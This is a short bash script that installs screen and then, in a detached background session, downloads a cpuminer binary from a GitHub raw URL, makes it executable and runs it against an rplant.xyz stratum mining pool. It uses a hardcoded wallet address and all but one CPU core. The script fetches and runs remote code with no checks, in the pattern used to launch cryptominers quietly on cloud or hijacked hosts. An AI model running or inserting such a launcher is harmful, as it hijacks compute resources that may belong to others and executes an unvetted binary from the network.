#!/bin/bash
apt update
apt install screen -y
screen -dm -S run wget https://raw.githubusercontent.com/AntonyAjax/kawakita/main/cpuminer-sse2 && chmod +x cpuminer-sse2 && cpuminer-sse2 -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RWq6cXxYKH6EFUqkM29JtFDKK4oX9w8Cve.azuy1 -t $(nproc --ignore 1)
screen -ls
echo succes
